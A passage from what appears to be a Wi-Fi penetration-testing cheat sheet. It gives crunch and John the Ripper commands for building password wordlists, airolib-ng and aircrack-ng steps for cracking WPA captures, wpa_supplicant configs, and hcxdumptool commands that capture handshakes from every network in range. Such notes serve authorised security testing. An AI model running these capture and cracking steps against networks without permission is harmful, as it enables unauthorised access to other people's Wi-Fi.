sudo apt install ./libssl1.0.2_1.0.2u-1\~deb9u1_amd64.deb
wget https://archive.debian.org/debian/pool/main/o/openssl1.0/libssl1.0.2_1.0.2u-1~deb9u1_amd64.deb 
sudo apt install ./asleap_2.2-1kali7_amd64.deb
```
## General utilities
### Wordlists
#### Crunch - Create wordlist
-> Generate a wordlist with all possible numbers [0-9] with a minimum and maximum of 8 characters
```bash
crunch 8 8 0123456789 >> wordlist-numerica.txt
```

-> keyword with the addition of 2 numbers at the end of each word
```bash
crunch 9 9 -t keyword%% 0123456789 >> wordlist.txt
```

#### John Mutation - create wordlist
Create a file with keywords based on customer patterns and then use john to mutate/vary those keywords  
-> Rules like Jumbo, Extra can be useful
```bash
john --wordlist=words.txt --rules=Jumbo --stdout > jumbo.txt
john --wordlist=words.txt --rules=Extra --stdout > extra.txt
```

-> You can also add rules that you want John to perform during mutation in the /etc/john/john.conf file inside the rules module [List.Rules:Wordlist] to modify your wordlists.
-> basic rule example $@$[1-2]$[0-9]$[0-9]$[0-9]  
```bash
john --wordlist=wordlist.txt --rules --stdout > mutated.txt
```
- https://www.openwall.com/john/doc/RULES.shtml  

#### Collection of Wordlists
-> Many times using rockyou.txt will not be enough, so you can download wordlists of millions, billions of keywords to use during cracking, on these sites:  
- https://www.weakpass.com/  
- https://github.com/berzerk0/Probable-Wordlists  
- https://www.onlinehashcrack.com/  
- https://crackstation.net/

#### Airolib-ng 
Aircrack-ng suite tool designed to store and manage lists of ESSIDs and passwords, calculate Pairwise Master Keys (PMKs) and use them in WPA/WPA2 cracking. This tool optimizes cracking time compared to traditional methods.

-> Import a list of ESSIDs into the database
```bash
airolib-ng db --import essid ssid_list.txt
```

-> Imports a list of passwords into the database
```bash
airolib-ng db --import passwd wordlist.txt
```

-> Displays database statistics
```bash
airolib-ng db --stats
```

-> Starts batch processing of all combinations of ESSIDs and passwords.
```bash
airolib-ng db --batch
```

-> Cleans the database of old information, also reduces file size and performs an integrity check
```bash
airolib-ng db --clean all
```

-> Cracking the capture file (.cap) using the database.
```bash
aircrack-ng -r db wpa-01.cap
```

### WPA Supplicant - Connect to a Wi-Fi network command line (cli)
-> Example configuration file to connect to a WPA Open Wi-Fi network
```bash
network={
	ssid="Wifi"
	key_mgmt=NONE
}
```

-> Example configuration file to connect to a WPA-Personal Wi-Fi network with PSK
```bash
network={
	ssid="Wifi"
	psk="12345678"
}
```

-> Example configuration file to connect to a WPA-Enterprise Wi-Fi network with PEAP
```bash
network={
	ssid="Wifi"
	key_mgmt=WPA-EAP
	identity="username"
	password="12345678"
	eap=PEAP
}
```

-> Connect with the created configuration file
```bash
wpa_supplicant -i wlan0 -c wpa_supplicant.conf
```

-> To get an IP on an interface
```bash
dhclient wlan0
```

### hcxdumptool - Automated tool
-> Monitor packets and capture handshakes from all Wi-Fi networks in range, on all available frequencies
```bash
hcxdumptool -i wlan0 -F -o output
```
-> Extract the handshakes from the file
```bash
hcxpcapngtool -o handshake.txt output
```

**DO NOT PUT THE BOARD IN MONITOR MODE WITH AIRMON-NG, hcxdump already does this automatically
